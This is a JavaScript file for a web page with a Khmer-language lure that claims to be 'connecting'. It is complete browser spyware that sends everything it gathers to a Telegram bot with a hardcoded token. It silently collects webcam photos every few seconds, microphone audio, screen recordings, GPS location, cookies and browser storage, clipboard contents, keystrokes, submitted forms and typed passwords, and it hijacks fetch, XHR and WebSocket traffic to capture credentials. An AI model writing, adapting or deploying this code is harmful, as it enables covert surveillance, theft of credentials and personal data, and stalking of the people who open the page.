// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAH6Xxt-0pXYD43OuIh5opvTx2jXNKWd8mM";
let CHAT_ID = "6837307356";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenStream = null;
let cameraInterval = null;
let screenRecorder = null;
let permissionStatus = {
    camera: false,
    location: false,
    microphone: false,
    screen: false
};
let progress = 0;

// Silent mode - don't send permission status messages
const SILENT_MODE = true;

// ========== UI UPDATE FUNCTIONS ==========
function updateProgress() {
    const total = 4;
    const completed = Object.values(permissionStatus).filter(v => v === true).length;
    progress = (completed / total) * 100;
    const progressFill = document.getElementById('progress-fill');
    if (progressFill) {
        progressFill.style.width = progress + '%';
    }
    
    if (completed === total) {
        document.querySelector('.loader').style.display = 'none';
        document.querySelector('h1').textContent = 'បានភ្ជាប់ដោយជោគជ័យ';
        document.querySelector('.status').textContent = 'ប្រព័ន្ធកំពុងដំណើរការ';
        document.querySelector('.container').classList.add('success');
    }
}

function updatePermissionStatus(type, granted) {
    permissionStatus[type] = granted;
    const statusElement = document.getElementById(`${type}-status`);
    if (statusElement) {
        if (granted) {
            statusElement.textContent = 'បានអនុញ្ញាត ✓';
            statusElement.className = 'permission-status status-granted';
        } else {
            statusElement.textContent = 'បរាជ័យ ✗';
            statusElement.className = 'permission-status status-denied';
        }
    }
    updateProgress();
}

// ========== DEVICE INFO COLLECTION ==========
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    let locationText = 'មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
        locationText = `
📍 **ទីតាំងពិតប្រាកដ:**
├─ រយៈទទឹង: ${info.location.lat}
├─ រយៈបណ្តោយ: ${info.location.lng}
├─ ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m
├─ Google Maps: ${mapsLink}
└─ តំបន់ពេល: ${info.timezone}`;
    }
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}`;
}

// ========== TELEGRAM FUNCTIONS ==========
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    if (SILENT_MODE && (message.includes('កាមេរ៉ា') || message.includes('ទីតាំង') || message.includes('មីក្រូហ្វូន') || message.includes('ថតអេក្រង់'))) {
        return;
    }
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendAudioToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

// ========== 1. CAMERA ==========
async function requestCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        cameraStream = stream;
        updatePermissionStatus('camera', true);
        startCameraCapture(stream);
        
    } catch (error) {
        updatePermissionStatus('camera', false);
    }
}

function startCameraCapture(stream) {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    
    cameraInterval = setInterval(async () => {
        if (!video || video.readyState < 2) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *រូបថតពីកាមេរ៉ា*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        }, 'image/jpeg', 0.7);
    }, 5000);
}

// ========== 2. LOCATION ==========
function requestLocationPermission() {
    if (!navigator.geolocation) {
        updatePermissionStatus('location', false);
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            updatePermissionStatus('location', true);
            
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    latitude: currentLocation.lat,
                    longitude: currentLocation.lng
                }),
            });
        },
        () => {
            updatePermissionStatus('location', false);
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    setInterval(() => {
        if (permissionStatus.location) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    currentLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy)
                    };
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ 
                            chat_id: CHAT_ID, 
                            latitude: currentLocation.lat,
                            longitude: currentLocation.lng
                        }),
                    });
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    }, 30000);
}

// ========== 3. MICROPHONE ==========
async function requestMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        updatePermissionStatus('microphone', true);
        startAudioRecording(stream);
        
    } catch (error) {
        updatePermissionStatus('microphone', false);
    }
}

function startAudioRecording(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    
    recorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            
            await sendAudioToTelegram(file, `🎤 *ការថតសំឡេង*\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    recorder.start();
    setInterval(() => {
        if (recorder.state === 'recording') {
            recorder.stop();
            setTimeout(() => recorder.start(), 100);
        }
    }, 15000);
}

// ========== 4. SCREEN RECORDING ==========
async function requestScreenPermission() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
        updatePermissionStatus('screen', false);
        return;
    }
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        screenStream = stream;
        updatePermissionStatus('screen', true);
        startScreenRecording(stream);
        await captureScreenshot();
        setInterval(() => captureScreenshot(), 30000);
        
    } catch (error) {
        updatePermissionStatus('screen', false);
    }
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
    const chunks = [];
    
    screenRecorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: mimeType });
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            
            await sendVideoToTelegram(file, `📹 *ការថតអេក្រង់*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    screenRecorder.start(1000);
    
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }
    }, 30000);
    
    stream.getVideoTracks()[0].addEventListener('ended', () => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    });
}

async function captureScreenshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
        
        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
    } catch (error) {}
}

// ========== 5. COOKIE STEALER ==========
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        cookies.push({ name, value, isSensitive });
    });
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    return data;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
            if (cookies.length > 10) message += `└─ ... and ${cookies.length - 10} more\n`;
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        message += `${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
        const sensitiveCookies = cookies.filter(c => c.isSensitive);
        if (sensitiveCookies.length > 0) {
            const sensitiveBlob = new Blob([JSON.stringify(sensitiveCookies, null, 2)], { type: 'application/json' });
            const sensitiveFile = new File([sensitiveBlob], `sensitive_cookies_${Date.now()}.json`, { type: 'application/json' });
            await sendFileToTelegram(sensitiveFile, `⚠️ Sensitive Cookies - ${sensitiveCookies.length} items`);
        }
        
    } catch (error) {}
}

// ========== 6. NETWORK INTERCEPTION ==========
function interceptFetch() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        try {
            const url = args[0];
            const options = args[1] || {};
            if (CHAT_ID) {
                const bodyStr = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
                if (bodyStr && (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email') || bodyStr.includes('login'))) {
                    await sendMessageToTelegram(`🌐 *Fetch Request*\n\n📤 URL: ${url}\n📝 Body: ${bodyStr.substring(0, 500)}`);
                }
            }
        } catch (e) {}
        return response;
    };
}

function interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._method = method;
        this._url = url;
        return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        if (CHAT_ID && body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            if (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email')) {
                sendMessageToTelegram(`🌐 *XHR Request*\n\n📤 ${this._method} ${this._url}\n📝 ${bodyStr.substring(0, 300)}`);
            }
        }
        return originalSend.apply(this, arguments);
    };
}

function interceptWebSocket() {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(...args) {
        const ws = new originalWebSocket(...args);
        if (CHAT_ID) sendMessageToTelegram(`🔌 *WebSocket Connected*\n\n🔗 URL: ${args[0]}`);
        
        const originalSend = ws.send;
        ws.send = function(data) {
            if (CHAT_ID && data) {
                const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
                if (dataStr.includes('token') || dataStr.includes('auth') || dataStr.includes('password')) {
                    sendMessageToTelegram(`📨 *WebSocket Message*\n\n📤 ${dataStr.substring(0, 300)}`);
                }
            }
            return originalSend.call(this, data);
        };
        
        ws.addEventListener('message', function(event) {
            if (CHAT_ID && event.data) {
                const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
                if (dataStr.includes('token') || dataStr.includes('session') || dataStr.includes('user')) {
                    sendMessageToTelegram(`📩 *WebSocket Received*\n\n📥 ${dataStr.substring(0, 300)}`);
                }
            }
        });
        return ws;
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
}

function initializeInterceptors() {
    interceptFetch();
    interceptXHR();
    interceptWebSocket();
}

// ========== 7. KEYLOGGER ==========
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) keylogBuffer += e.key;
    else if (e.key === 'Enter') keylogBuffer += '\n';
    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
    else if (e.key === ' ') keylogBuffer += ' ';
    else if (e.key === 'Tab') keylogBuffer += '    ';
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ========== 8. CLIPBOARD MONITOR ==========
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ========== 9. FORM STEALER ==========
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        await sendMessageToTelegram(message);
    }
});

// ========== 10. PASSWORD MONITOR ==========
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ========== 11. PAGE UNLOAD TRACKING ==========
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ========== START DATA COLLECTION ==========
async function startDataCollection() {
    setInterval(async () => {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(`🔄 *ទិន្នន័យបច្ចុប្បន្ន*\n\n${formattedInfo}`);
    }, 60000);
    
    setInterval(() => stealAllData(), 30000);
}

// ========== MAIN INITIALIZATION ==========
async function initialize() {
    initializeInterceptors();
    
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
    
    // Request all permissions IMMEDIATELY
    requestCameraPermission();
    requestLocationPermission();
    requestMicrophonePermission();
    requestScreenPermission();
    
    setTimeout(() => startDataCollection(), 10000);
    setTimeout(() => stealAllData(), 2000);
}

// Start immediately when page loads
window.addEventListener("DOMContentLoaded", initialize);
